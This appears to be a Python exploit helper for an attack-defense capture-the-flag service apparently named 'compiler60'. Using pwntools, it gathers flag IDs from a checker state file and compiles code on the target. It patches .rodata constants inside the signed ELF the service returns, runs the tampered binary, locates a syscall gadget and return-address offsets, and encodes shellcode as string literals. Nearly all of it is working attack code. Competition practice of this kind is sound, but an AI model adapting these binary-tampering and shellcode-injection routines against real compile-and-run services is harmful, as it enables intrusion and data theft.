import pwn
import requests
import string
import json
import tempfile
import sys
from base64 import b64decode, b64encode
from hashlib import sha1

pwn.context.log_level = "error"
pwn.context.arch = "amd64"

DEBUG = False
# True: patch rodata 
# False: recompile code with updated constants
PATCH_RODATA_OR_RECOMPILE = True

def launchExploit(mainFunc):
    if len(sys.argv) != 3:
        for flag_id in getFlagIdsFromLocalStore():
            mainFunc("::1", flag_id)
    else:
        mainFunc(sys.argv[1], sys.argv[2])

def getFlagIdsFromLocalStore() -> list[str]:
    with open("../checker/_state.json", "r") as f:
        jsonStr = f.read()
    stateData = json.loads(jsonStr)
    flagPasswords = stateData["flag-passwords"]
    flagPasswords = b64decode(flagPasswords).decode()
    flagPasswords = json.loads(flagPasswords).values()
    # sha1 hash to get flagId/filename from flagPassword
    flagIds = [sha1(pw.encode()).hexdigest() for pw in flagPasswords]
    return flagIds

def compileCode(host: string, code: string) -> tuple[object, pwn.ELF]:
    url = f"http://[{host}]:6061/compile"
    r = requests.post(url, headers={"Content-Type": "text/plain"}, data=code.encode('UTF-8'))

    assert r.status_code == 200
    json = r.json()

    # write elf to file (cause pwntools wants it) and parse elf
    with tempfile.NamedTemporaryFile(prefix="compiler60-exploit-") as fp:
        fp.write(b64decode(json["binary"]))
        return json, pwn.ELF(fp.name)

# returns the offset in the elf for reurn address from the first call in the given function
def getOffsetForReturnFromFirstCall(elf: pwn.ELF, functionName: str) -> int:
    # disassemble first 200 bytes
    topAsm = elf.disasm(elf.symbols[functionName], 200)
    # find first call instruction
    _, _, afterCall = topAsm.partition("call ")
    # get next instruction
    _, _, afterCall = afterCall.partition("\n")
    # and parse offset
    afterCall, _, _ = afterCall.partition(":")
    return int(afterCall, 16)

def findSyscallInOpenWOConfidential(elf: pwn.ELF) -> int:
    syscall = bytes.fromhex("0f05") # syscall opcode
    openWOAddr = elf.symbols["openWOConfidential"]
    openWOCode = elf.data[openWOAddr:][:100]
    return openWOAddr + openWOCode.index(syscall)

def findPatternInRodata(elf: pwn.ELF, pattern: int) -> int:
    rodata = elf.get_section_by_name(".rodata")
    pattern_off = rodata.data().index(pwn.p64(pattern))
    return rodata['sh_offset'] + pattern_off

def findInStrings(elf: pwn.ELF, s: bytes) -> int:
    strings = elf.get_section_by_name(".strings")
    string_off = strings.data().index(s)
    return strings['sh_offset'] + string_off

def replacePatternWith(host: string, signedElf: object, elf: pwn.ELF, code: string, replacements: list[tuple[int, int]]) -> object:
    if PATCH_RODATA_OR_RECOMPILE:
        for pattern, replacement in replacements:
            pattern_off = findPatternInRodata(elf, pattern)
            print("pattern_off", hex(pattern_off))

            if replacement < 0:
                replacement += 2 ** 64
            elf.p64(pattern_off, replacement)

        if DEBUG:
            with open("./a.out", "wb") as f:
                f.write(elf.data)

        # base64 encode patched elf
        signedElf["binary"] = b64encode(elf.data).decode()
        return signedElf
    else:
        for pattern, replacement in replacements:
            code = code.replace(str(pattern), str(replacement))

        signedElf, elf = compileCode(host, code)
        return signedElf

def executeAndRetStdout(host: string, signedElf: object) -> str:
    url = f"http://[{host}]:6062/execute"
    r = requests.post(url, headers={"Content-Type": "application/json;charset=UTF-8"}, json=signedElf)

    assert r.status_code == 200
    runResult = r.json()

    return b64decode(runResult["stdout"]).decode()

def shellcodeToStringLiteral(s: bytes) -> string:
    # print all characters in hex here to prevent getting the string length vulnerability
    # see: https://stackoverflow.com/q/45612822
    return ''.join(f"\\x{c:02x}" for c in s)
